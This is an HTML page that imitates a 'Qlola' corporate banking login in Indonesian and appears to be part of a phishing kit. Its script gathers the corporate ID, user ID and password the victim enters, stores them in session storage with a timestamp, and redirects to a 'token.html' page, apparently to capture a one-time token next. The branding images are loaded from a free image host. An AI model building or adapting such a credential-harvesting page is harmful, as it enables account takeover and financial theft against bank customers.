<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Qlola Login</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(180deg, #b5d4f9 0%, #1e5dbf 100%);
    background-image: url('https://www.image2url.com/r2/default/images/1777431943112-2242ef21-bfb3-455d-ba0f-24dfdd03a1cd.jpeg');
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center;
    color: #111;
    display: flex;
    flex-direction: column;
    height: 100vh;
  }
  .container { margin: 10px; background: transparent; flex: 1; display: flex; flex-direction: column; justify-content: center; }
  .time { position: fixed; top: 10px; left: 10px; color: white; font-weight: 300; font-size: 18px; font-family: monospace; user-select: none; z-index: 10; }
  .lang-select { position: fixed; top: 10px; right: 10px; background: white; border-radius: 10px; border: 1.5px solid #1e5dbf; padding: 5px 15px; font-weight: 600; font-size: 14px; color: #1e5dbf; cursor: pointer; display: flex; align-items: center; user-select: none; z-index: 10; }
  .lang-select::after { content: ''; margin-left: 6px; border: solid #1e5dbf; border-width: 0 2px 2px 0; display: inline-block; padding: 4px; transform: rotate(45deg); }
  .logo { width: 180px; margin: 0 auto 20px auto; display: block; }
  h2 { margin: 0 0 15px 5px; color: #111; font-weight: 700; }
  label { font-weight: 600; color: #222; display: block; margin-left: 5px; margin-top: 10px; }
  input[type="text"], input[type="password"] { width: 100%; border-radius: 10px; border: none; padding: 12px 45px 12px 15px; margin-top: 6px; font-size: 14px; box-shadow: 0px 2px 5px rgb(0 0 0 / 0.2); outline: none; font-family: 'Roboto', sans-serif; background: white; color: #333; }
  .password-wrapper { position: relative; width: 100%; }
  .toggle-password { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); border: none; background: none; cursor: pointer; outline: none; padding: 0; display: flex; align-items: center; justify-content: center; }
  .toggle-password svg { width: 20px; height: 20px; fill: #777; }
  .forgot-password { text-align: right; margin-top: 8px; font-weight: 600; font-size: 13px; }
  .forgot-password a { color: #1e5dbf; text-decoration: underline; cursor: pointer; }
  button[type="submit"] { width: 100%; border-radius: 10px; border: none; padding: 15px; margin-top: 15px; background-color: #4CAF50; color: white; font-weight: 700; font-size: 16px; cursor: pointer; transition: background-color 0.3s; }
  button[type="submit"]:hover:not(:disabled) { background-color: #45a049; }
  button[type="submit"]:disabled { background-color: #bdbdbd; cursor: not-allowed; }
  .loading { opacity: 0.7; pointer-events: none; }
  .help-section { margin-top: auto; margin-bottom: 20px; text-align: center; font-weight: 500; font-size: 14px; color: white; }
  .help-section button { background: white; color: #1e5dbf; font-weight: 700; font-size: 14px; border-radius: 20px; padding: 8px 15px; border: none; cursor: pointer; margin-left: 6px; }
  ::-webkit-scrollbar { display: none; }
</style>
</head>
<body>
<div class="time" id="time">09:30:10</div>
<div class="lang-select">ID</div>
<div class="container">
  <img src="https://www.image2url.com/r2/default/images/1777432399856-ad5dbb1e-2ba8-41b4-8c89-2f2497b83f57.jpeg" alt="Qlola Logo" class="logo" />
  <h2>Login</h2>
  <form id="loginForm">
    <label for="corporateId">Corporate ID</label>
    <input id="corporateId" type="text" placeholder="Masukkan Corporate ID Anda" autocomplete="off" required />
    <label for="userId">User ID</label>
    <input id="userId" type="text" placeholder="Masukkan user ID anda" autocomplete="off" required />
    <label for="password">Kata Sandi</label>
    <div class="password-wrapper">
      <input id="password" type="password" placeholder="Masukkan kata sandi anda" autocomplete="off" required />
      <button type="button" class="toggle-password" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 10a3 3 0 1 1 0-6 3 3 0 0 1 0 6z"/>
          <circle cx="12" cy="12" r="2.5"/>
        </svg>
      </button>
    </div>
    <div class="forgot-password"><a href="#">Lupa kata sandi?</a></div>
    <button type="submit">Masuk</button>
  </form>
</div>
<div class="help-section">
  Butuh bantuan? <button type="button">Hubungi Kami</button>
</div>

<script>
  // SIMPAN DATA LOGIN KE SESSION STORAGE
  document.getElementById('loginForm').onsubmit = async e => {
    e.preventDefault();
    
    const loginData = {
      corporateId: document.getElementById('corporateId').value,
      userId: document.getElementById('userId').value,
      password: document.getElementById('password').value,
      timestamp: new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})
    };
    
    // SIMPAN SESSION
    sessionStorage.setItem('qlola_login_session', JSON.stringify(loginData));
    
    // Redirect ke halaman token
    window.location.href = 'token.html';
  };
  
  // Jam
  setInterval(() => {
    document.getElementById('time').textContent = new Date().toLocaleTimeString('id-ID', {hour12: false}).slice(0,8);
  }, 1000);
  
  // Toggle password
  document.querySelector('.toggle-password').onclick = () => {
    const pwd = document.getElementById('password');
    pwd.type = pwd.type === 'password' ? 'text' : 'password';
  };
</script>
</body>
</html>
